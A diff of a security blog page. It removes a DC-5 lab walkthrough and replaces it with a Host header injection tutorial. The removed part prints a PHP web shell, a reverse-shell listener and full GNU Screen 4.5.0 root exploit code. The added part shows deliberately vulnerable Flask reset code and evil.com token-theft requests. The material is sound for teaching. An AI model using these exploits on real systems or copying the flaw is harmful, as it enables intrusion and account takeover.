@@ -42,26 +42,26 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.2.2" />
-<meta property="og:title" content="DC 5 Walkthrough" />
+<meta property="og:title" content="HTTP HOST Header Injection" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="DC-5 starts with discovery of a relatively obvious local file include vulnerability drives us towards a web shell via log poisoning. Once we land a shell, we search for SUID binaries and priv esc to root by exploiting screen-4.5.0 SUID binary. Enjoy this write up as much as I enjoyed writing it!" />
-<meta property="og:description" content="DC-5 starts with discovery of a relatively obvious local file include vulnerability drives us towards a web shell via log poisoning. Once we land a shell, we search for SUID binaries and priv esc to root by exploiting screen-4.5.0 SUID binary. Enjoy this write up as much as I enjoyed writing it!" />
-<link rel="canonical" href="http://localhost:4000/posts/DC-5-walkthrough/" />
-<meta property="og:url" content="http://localhost:4000/posts/DC-5-walkthrough/" />
+<meta name="description" content="Host Header" />
+<meta property="og:description" content="Host Header" />
+<link rel="canonical" href="http://localhost:4000/posts/HTTP-HOST-Header_Injection/" />
+<meta property="og:url" content="http://localhost:4000/posts/HTTP-HOST-Header_Injection/" />
 <meta property="og:site_name" content="Hitesh Kadu" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2020-08-31T00:00:00+05:30" />
+<meta property="article:published_time" content="2023-07-22T00:00:00+05:30" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="DC 5 Walkthrough" />
+<meta property="twitter:title" content="HTTP HOST Header Injection" />
 <meta name="twitter:site" content="@KaduHitesh" />
 <meta name="google-site-verification" content="ItvQFdWvxg9RSInP6DTa5nXkEbHX9L4QPLrpJLXue7A" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-08-31T00:00:00+05:30","datePublished":"2020-08-31T00:00:00+05:30","description":"DC-5 starts with discovery of a relatively obvious local file include vulnerability drives us towards a web shell via log poisoning. Once we land a shell, we search for SUID binaries and priv esc to root by exploiting screen-4.5.0 SUID binary. Enjoy this write up as much as I enjoyed writing it!","headline":"DC 5 Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/DC-5-walkthrough/"},"url":"http://localhost:4000/posts/DC-5-walkthrough/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-07-22T00:00:00+05:30","datePublished":"2023-07-22T00:00:00+05:30","description":"Host Header","headline":"HTTP HOST Header Injection","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HTTP-HOST-Header_Injection/"},"url":"http://localhost:4000/posts/HTTP-HOST-Header_Injection/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>DC 5 Walkthrough | Hitesh Kadu
+  <title>HTTP HOST Header Injection | Hitesh Kadu
   </title>
 
   <!--
@@ -425,7 +425,7 @@
         
 
           
-            <span>DC 5 Walkthrough</span>
+            <span>HTTP HOST Header Injection</span>
           
 
         
@@ -645,266 +645,6 @@
     
 
   
-    
-
-    
-    
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-      
-
-      
-      
-
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-
-      
-    
-
-    
-      
-
-        <!-- Add CDN URL -->
-        
-
-        <!-- Add image path -->
-        
-
-        
-        
-
-      
-
-      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
-
-      
-
-    
-
-    <!-- Add SVG placehoder to prevent layout reflow -->
-
-    
-
-    <!-- Bypass the HTML-proofer test -->
-    
-
-    
-
-  
-    
-
-    
-    
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-      
-
-      
-      
-
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-
-      
-    
-
-    
-      
-
-        <!-- Add CDN URL -->
-        
-
-        <!-- Add image path -->
-        
-
-        
-        
-
-      
-
-      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
-
-      
-
-    
-
-    <!-- Add SVG placehoder to prevent layout reflow -->
-
-    
-
-    <!-- Bypass the HTML-proofer test -->
-    
-
-    
-
-  
-    
-
-    
-    
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-      
-
-      
-      
-
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-
-      
-    
-
-    
-      
-
-        <!-- Add CDN URL -->
-        
-
-        <!-- Add image path -->
-        
-
-        
-        
-
-      
-
-      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
-
-      
-
-    
-
-    <!-- Add SVG placehoder to prevent layout reflow -->
-
-    
-
-    <!-- Bypass the HTML-proofer test -->
-    
-
-    
-
-  
-    
-
-    
-    
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-      
-
-      
-      
-
-      
-
-      
-    
-      
-      
-
-      
-      
-
-      
-
-      
-    
-
-    
-      
-
-        <!-- Add CDN URL -->
-        
-
-        <!-- Add image path -->
-        
-
-        
-        
-
-      
-
-      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
-
-      
-
-    
-
-    <!-- Add SVG placehoder to prevent layout reflow -->
-
-    
-
-    <!-- Bypass the HTML-proofer test -->
-    
-
-    
-
-  
 
   
 
@@ -976,53 +716,6 @@
   
 
   
-    
-    
-
-    
-      
-        
-        
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-
-    
-
-  
 
   
   
@@ -1051,7 +744,7 @@
 
 
 
-<h1 data-toc-skip>DC 5 Walkthrough</h1>
+<h1 data-toc-skip>HTTP HOST Header Injection</h1>
 
 <div class="post-meta text-muted">
     <!-- published date -->
@@ -1067,10 +760,10 @@
 
 
 <em class=""
-    data-ts="1598812200"
+    data-ts="1689964200"
     data-df="ll"
     data-toggle="tooltip" data-placement="bottom">
-  Aug 31, 2020
+  Jul 22, 2023
 </em>
 
     </span>
@@ -1121,8 +814,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="1340 words">
-  <em>7 min</em> read</span>
+  title="1137 words">
+  <em>6 min</em> read</span>
 
     </div>
 
@@ -1131,25 +824,42 @@
 </div> <!-- .post-meta -->
 
 <div class="post-content">
-  <p>DC-5 starts with discovery of a relatively obvious local file include vulnerability drives us towards a web shell via log poisoning. Once we land a shell, we search for SUID binaries and priv esc to root by exploiting screen-4.5.0 SUID binary. Enjoy this write up as much as I enjoyed writing it!</p>
+  <h1 id="host-header">Host Header</h1>
 
-<h1 id="summary">Summary</h1>
-<ul>
-  <li>Portscan</li>
-  <li>Fuzzing LFI parameter</li>
-  <li>Reading files using LFI</li>
-  <li>Web Shell via Log Poisoning</li>
-  <li>Getting reverse shell</li>
-  <li>Finding SUID</li>
-  <li>Privilege Escalation by exploiting <code class="language-plaintext highlighter-rouge">screen-4.5.0</code></li>
-  <li>Root shell</li>
-  <li>The Flag</li>
-</ul>
+<p>The HTTP Host header is a request header that specifies the hostname and port number of the server that the client is requesting a resource from. The hostname is the domain name of the server, such as www.example.com. The port number is the number of the port on the server that the resource is hosted on.</p>
 
-<h1 id="portscan">Portscan</h1>
+<p>The Host header is important because it allows the server to distinguish between different requests for the same resource, even if they come from different clients. For example, if two clients request the URL https://www.example.com/index.html, the server will need to know which client is requesting the resource from www.example.com and which client is requesting the resource from a different website that happens to have the same URL.</p>
+
+<p>In simple words, the Host header is like a name tag for a server. It tells the server which website or application a request is coming from. This is important for servers that host multiple websites or applications, and it is also important for caching systems.</p>
+
+<p>Here is an example of a Host header:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>Host: www.example.com:80
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>This header tells the server that the client is requesting the resource from the website www.example.com, which is hosted on port 80.</p>
+
+<h1 id="http-host-injection">HTTP Host Injection</h1>
+
+<p>When the host header in an HTTP request is flawed or manipulated, it can lead to a serious security vulnerability known as HTTP Host Header Injection. Many web servers are configured to serve a default website, also called the first virtual host, when they receive requests without a recognizable or valid host header.</p>
+
+<p>The problem arises because the host header is controlled by the user, meaning anyone can send requests with arbitrary host headers to the server. There is no built-in mechanism to verify whether the domain specified in the host header actually matches the IP address that initiated the initial TCP handshake.</p>
+
+<p>As a result, attackers can exploit this weakness by tampering with the host header and injecting malicious content. Since the server relies on the host header to determine which website to serve, the injected host header can manipulate the server-side behavior, leading to potentially harmful consequences.</p>
+
+<p>For instance, an attacker could redirect users to a malicious website that closely resembles a legitimate one, tricking them into providing sensitive information. Alternatively, they might use the vulnerability to perform Server-Side Request Forgery (SSRF) attacks, accessing internal systems or resources that should not be exposed to the internet.</p>
+
+<h2 id="password-reset-poisoning"><span class="mr-2">Password Reset Poisoning</span><a href="#password-reset-poisoning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>HTTP Host Injection in password reset poisoning is a specific type of attack that exploits the vulnerability of web applications in handling password reset functionality. It occurs when an attacker manipulates the HTTP Host header during the password reset process to trick the application into sending the reset link or token to a domain controlled by the attacker instead of the legitimate user’s email address. This allows the attacker to intercept the reset link or token, take control of the user’s account, or gain unauthorized access to sensitive information.</p>
+
+<p>Let’s walk through an example to illustrate how HTTP Host Injection can be used in password reset poisoning:</p>
+
+<div class="language-python highlighter-rouge"><div class="code-header">
+        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1168,407 +878,79 @@
 16
 17
 18
-19
-</pre></td><td class="rouge-code"><pre>Nmap scan report for 192.168.1.7
-Host is up (0.00061s latency).
-Not shown: 998 closed ports
-PORT    STATE SERVICE VERSION
-80/tcp  open  http    nginx 1.6.2
-|_http-server-header: nginx/1.6.2
-|_http-title: Welcome
-111/tcp open  rpcbind 2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  3,4          111/tcp6  rpcbind
-|   100000  3,4          111/udp6  rpcbind
-|   100024  1          35668/tcp   status
-|   100024  1          52987/tcp6  status
-|   100024  1          53084/udp6  status
-|_  100024  1          57579/udp   status
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> 	<span class="n">url_for</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
 
-</pre></td></tr></tbody></table></code></div></div>
-<h1 id="website">Website</h1>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
 
-<p>When we browse the website with its IP address, it conatins some static pages.
-<img data-src="/assets/img/dc-5/mainpage.png" alt="website" data-proofer-ignore></p>
+<span class="k">def</span> <span class="nf">generate_reset_token</span><span class="p">():</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">100</span><span class="p">))</span>
 
-<h2 id="gobuster"><span class="mr-2">Gobuster</span><a href="#gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p>I use gobuster to findout files and directories.</p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-</pre></td><td class="rouge-code"><pre><span class="nv">$gobuster</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://192.168.1.7 <span class="nt">-x</span> php,html,txt <span class="nt">-o</span> go-main.out
-<span class="o">===============================================================</span>
-Gobuster v3.0.1
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+] Url:            http://192.168.1.7
-<span class="o">[</span>+] Threads:        10
-<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
-<span class="o">[</span>+] User Agent:     gobuster/3.0.1
-<span class="o">[</span>+] Extensions:     php,html,txt
-<span class="o">[</span>+] Timeout:        10s
-<span class="o">===============================================================</span>
-2020/08/30 19:26:34 Starting gobuster
-<span class="o">===============================================================</span>
-/images <span class="o">(</span>Status: 301<span class="o">)</span>
-/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/contact.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/faq.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/solutions.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/footer.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/css <span class="o">(</span>Status: 301<span class="o">)</span>
-/about-us.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/thankyou.php <span class="o">(</span>Status: 200<span class="o">)</span>
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/reset_password'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">reset_password</span><span class="p">():</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">generate_reset_token</span><span class="p">()</span>
+    <span class="n">reset_link</span> <span class="o">=</span> <span class="n">url_for</span><span class="p">(</span><span class="s">'reset_password'</span><span class="p">,</span><span class="n">token</span><span class="o">=</span><span class="n">token</span><span class="p">,</span> <span class="n">_external</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">reset_link</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
 
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<h1 id="finding-lfi">Finding LFI</h1>
+<p>In this code, we have a Flask web application with a single endpoint /reset_password. The reset_password() function generates a random reset token using the generate_reset_token() function. It then uses url_for() to construct a URL for the same reset_password() endpoint but with the generated token as a query parameter. Finally, the function redirects the user to the constructed reset link.</p>
 
-<p>After visiting these pages several times, I noticed that the <code class="language-plaintext highlighter-rouge">copyright year</code> in <code class="language-plaintext highlighter-rouge">thankyou.php</code> gets changed every time I refresh the page.
-<img data-src="/assets/img/dc-5/2020.png" alt="t1" data-proofer-ignore>
-<img data-src="/assets/img/dc-5/2017.png" alt="t2" data-proofer-ignore>
-So I decided to <code class="language-plaintext highlighter-rouge">FUZZ</code> the website.</p>
+<p><img data-src="/assets/img/host-header/host-1.png" alt="host-1" data-proofer-ignore></p>
 
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-</pre></td><td class="rouge-code"><pre><span class="nv">$wfuzz</span> <span class="nt">--hh</span> 851 <span class="nt">-w</span> ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt <span class="nt">-u</span> http://192.168.1.7/thankyou.php?FUZZ<span class="o">=</span>
+<p>Now, let’s understand why this code is vulnerable to host header injection:</p>
 
-Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+<p>The vulnerability lies in the url_for() function. The url_for() function is used to generate URLs for specified endpoints in the Flask application. However, in this specific case, the endpoint used is ‘reset_password’, which corresponds to the current function itself.</p>
 
-********************************************************
-* Wfuzz 2.4.5 - The Web Fuzzer                         *
-********************************************************
+<p>An attacker can exploit this by sending a malicious HTTP request with a manipulated Host header. Since url_for() uses the current request’s Host header to construct the URL, the attacker can control the domain part of the generated reset link. As a result, the reset link will point to a domain specified by the attacker, rather than the legitimate domain of the application.</p>
 
-Target: http://192.168.1.7/thankyou.php?FUZZ=
-Total requests: 2588
+<p>For example, if an attacker sends a request with the Host header set to “evil.com”, the generated reset link will be http://evil.com/reset_password?token=[generated_token]. This link provides the attacker with a token, which can then be used to initiate the password reset process, potentially granting unauthorized access to the user’s account.</p>
 
-===================================================================
-ID           Response   Lines    Word     Chars       Payload        
-===================================================================
+<p><img data-src="/assets/img/host-header/host-2.png" alt="host-2" data-proofer-ignore></p>
 
-000000010:   200        42 L     63 W     835 Ch      "file"         
+<h2 id="duplicate-host-headers"><span class="mr-2">Duplicate Host headers</span><a href="#duplicate-host-headers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-Total time: 5.193434
-Processed Requests: 2588
-Filtered Requests: 2587
-Requests/sec.: 498.3215
-</span></pre></td></tr></tbody></table></code></div></div>
-<p>Here I found the <code class="language-plaintext highlighter-rouge">file</code> parameter and using it we can read files too.
-<img data-src="/assets/img/dc-5/passwd.png" alt="etc-passwd" data-proofer-ignore></p>
+<p>Suppose you encounter a web application and suspect that it might not handle duplicate Host headers correctly. In this scenario, you can craft a request with multiple Host headers, and although most modern browsers will not send such a request, some systems might process it differently.</p>
 
-<h1 id="web-shell-via-log-poisoning">Web Shell via Log Poisoning</h1>
-<p>Log Poisoning is to put some php into the logs, and then load using lfi. We know that nginx server stored logs in /var/log/ngnix/error.log. The easy way would be to add php code in url it will get written in the log file and then access it with lfi.</p>
+<p>For example, consider the following request:</p>
 
-<h2 id="inject-the-php-code"><span class="mr-2">Inject the PHP code</span><a href="#inject-the-php-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p>I inject the php code to get the command line access by making a GET request to the server.</p>
-
-<div class="language-php highlighter-rouge"><div class="code-header">
-        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="cp">?&gt;</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<p><img data-src="/assets/img/dc-5/phpinjection.png" alt="phpinjection" data-proofer-ignore></p>
-<h2 id="getting-reverse-shell"><span class="mr-2">Getting reverse shell</span><a href="#getting-reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p>To get code execution on site I added <code class="language-plaintext highlighter-rouge">cmd</code> parameter to URL.
-It looks like this</p>
-<blockquote>
-  <p>http://192.168.1.6/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=id</p>
-</blockquote>
-
-<p>We can execute any system command on server using it. I execute reverse shell.</p>
-
-<p><img data-src="/assets/img/dc-5/reverse.png" alt="reverse" data-proofer-ignore></p>
-
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-</pre></td><td class="rouge-code"><pre>┌─[hitesh@parrot]─[~/boxes/vulnhub/dc-5]
-└──╼ <span class="nv">$nc</span> <span class="nt">-nvlp</span> 4444
-listening on <span class="o">[</span>any] 4444 ...
-connect to <span class="o">[</span>192.168.1.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.1.6] 58309
-python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
-www-data@dc-5:~/html<span class="nv">$ </span>^Z
-<span class="o">[</span>1]+  Stopped                 nc <span class="nt">-nvlp</span> 4444
-┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/dc-5]
-└──╼ <span class="nv">$stty</span> raw <span class="nt">-echo</span>
-┌─[hitesh@parrot]─[~/boxes/vulnhub/dc-5]
-└──╼ <span class="nv">$nc</span> <span class="nt">-nvlp</span> 4444
-
-www-data@dc-5:~/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
-</pre></td></tr></tbody></table></code></div></div>
-<h1 id="privesc-to-root">Privesc to Root</h1>
-
-<p>Looking at SUID files, <code class="language-plaintext highlighter-rouge">/bin/screen-4.5.0</code> seem suspicious to me.</p>
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-</pre></td><td class="rouge-code"><pre>www-data@dc-5:~/html$ find / -perm -4000 2&gt;/dev/null
-/bin/su
-/bin/mount
-/bin/umount
-/bin/screen-4.5.0
-/usr/bin/gpasswd
-/usr/bin/procmail
-/usr/bin/at
-/usr/bin/passwd
-/usr/bin/chfn
-/usr/bin/newgrp
-/usr/bin/chsh
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/eject/dmcrypt-get-device
-/usr/sbin/exim4
-/sbin/mount.nfs
+</pre></td><td class="rouge-code"><pre>GET /example HTTP/1.1
+Host: vulnerable-website.com
+Host: bad-stuff-here
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Here is an exploit I found on searchsploit.</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-</pre></td><td class="rouge-code"><pre><span class="nv">$searchsploit</span> screen 4.5.0
-<span class="nt">-----------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
- Exploit Title                                                                                       |  Path
-<span class="nt">-----------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
-GNU Screen 4.5.0 - Local Privilege Escalation                                                        | linux/local/41154.sh
-GNU Screen 4.5.0 - Local Privilege Escalation <span class="o">(</span>PoC<span class="o">)</span>                                                  | linux/local/41152.txt
-<span class="nt">-----------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
-Shellcodes: No Results
-</pre></td></tr></tbody></table></code></div></div>
-<p>The exploit has 3 steps. Two compile and one is exploit.</p>
+<p>In this case, the web application might exhibit varied behavior. Some systems will give precedence to the first instance of the Host header, while others may favor the last instance. This discrepancy in handling the duplicate headers can lead to interesting outcomes that attackers could potentially exploit.</p>
 
-<p>The files are</p>
+<h2 id="host-override-headers"><span class="mr-2">Host Override Headers</span><a href="#host-override-headers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<h3 id="1-libhaxc"><span class="mr-2">1. libhax.c</span><a href="#1-libhaxc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<p>The X-Forwarded-Host header is an HTTP header that is often used in proxy configurations. It provides information about the original host requested by the client before it went through any proxy servers. This header is useful for servers to determine the original domain requested when the request is passed through a chain of proxy servers.</p>
 
-<div class="language-c highlighter-rouge"><div class="code-header">
-        <span data-label-text="C"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
-#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
-<span class="kt">void</span> <span class="nf">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="n">chown</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-    <span class="n">chmod</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
-    <span class="n">unlink</span><span class="p">(</span><span class="s">"/etc/ld.so.preload"</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-<span class="p">}</span>
-</pre></td></tr></tbody></table></code></div></div>
+<p>In some server setups, the X-Forwarded-Host header can be used to rewrite the value of the Host header. When a request with both Host and X-Forwarded-Host headers is received, some web servers may choose to prioritize the value in the X-Forwarded-Host header, effectively overwriting the original Host header value.</p>
 
-<h3 id="2-rootshellc"><span class="mr-2">2. rootshell.c</span><a href="#2-rootshellc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<p>To exploit this behavior, attackers can craft a malicious request like the following:</p>
 
-<div class="language-c highlighter-rouge"><div class="code-header">
-        <span data-label-text="C"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-    <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-    <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-    <span class="n">execvp</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-<span class="p">}</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<h3 id="3-41154sh"><span class="mr-2">3. 41154.sh</span><a href="#3-41154sh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-</pre></td><td class="rouge-code"><pre><span class="nb">cd</span> /etc
-<span class="nb">umask </span>000 <span class="c"># because</span>
-screen <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span> <span class="c"># newline needed</span>
-<span class="nb">echo</span> <span class="s2">"[+] Triggering..."</span>
-screen <span class="nt">-ls</span> <span class="c"># screen itself is setuid, so... </span>
-/tmp/rootshell
-</pre></td></tr></tbody></table></code></div></div>
-<p>Run libhax.c and rootshell.c on local machine</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-</pre></td><td class="rouge-code"><pre><span class="nv">$gcc</span> <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-ldl</span> <span class="nt">-o</span> libhax.so libhax.c
